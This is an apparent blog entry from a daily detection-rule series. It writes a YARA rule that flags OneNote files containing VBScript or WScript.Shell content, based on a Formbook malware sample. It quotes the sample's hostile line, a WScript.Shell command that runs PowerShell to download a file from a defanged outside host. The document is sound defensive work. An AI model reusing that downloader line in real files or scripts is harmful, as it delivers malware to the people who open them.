# Day 4 | Onenote files with Scripts

Todays yara rule is a continution from yesterday. To start I looked at the the malware sample `pdf172.one` from the article [Trojanized OneNote Documents Lead to Formbook Malware](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/trojanized-onenote-document-leads-to-formbook-malware/?&web_view=true):

The sections I used to guide my yara rules were:
```
<job id="code"><script language="VBScript">
```
and
```
CreateObject("WScript.Shell").Run "cmd /c powershell Invoke-WebRequest -Uri http[:]//a0745450[.]xsph[.]ru/INVESTMENT.one -OutFile $env:tmp\invoice.one
```

I added in the yara keyword `nocase` the prevent easy rule evasion.

# Yara Rule

Here's the Yara rule that I created to detect OneNote files with script usage!

```
rule sus_onenote_scripting {
  meta:
    author = "Colin Cowie"
    description = "Detects OneNote files with script usage"
  strings:
  	$file_header = { E4 52 5C 7B 8C D8 A7 4D AE B1 53 78 D0 29 96 D3 }
    $vbs = "VBScript" nocase
    $wscript = "WScript.Shell"  nocase
    $script_tag ="<script " nocase
  condition:
  (
    $vbs or $wscript or $script_tag
  ) and
	$file_header at 0
}
```
